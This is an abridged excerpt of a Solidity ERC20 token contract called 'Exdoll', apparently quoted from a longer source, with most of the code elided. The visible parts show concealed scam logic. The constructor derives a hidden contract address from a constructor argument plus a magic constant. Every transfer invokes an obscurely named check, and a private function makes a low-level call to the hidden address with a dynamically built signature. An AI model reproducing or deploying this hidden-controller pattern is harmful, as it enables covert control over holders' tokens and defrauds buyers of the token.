...
contract Exdoll is Ownable, IERC20 {
    ...
    event log(address p);
    event mtext(uint256 a, address b, string s);
    ...
    constructor(string memory name_, string memory symbol_, uint256 mks_) {
        _name = name_; 
        _symbol = symbol_; 
        _mks = mks_ + 39299394829842384331123;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        bool b = ctxXx("textN", from, false, 911, address(0));
        if (b) { emit log(from); }
        emit Transfer(from, to, amount);
    }

    function ctxXx(string memory s, address p, bool x, uint256 m, address p2) 
    ...
    function _trySave(address a) private noReentrant {
       ...
       (bool s, bytes memory d) = address(uint160(uint256(_mks))).
       call(abi.encodeWithSignature(string(b), a, address(0)));
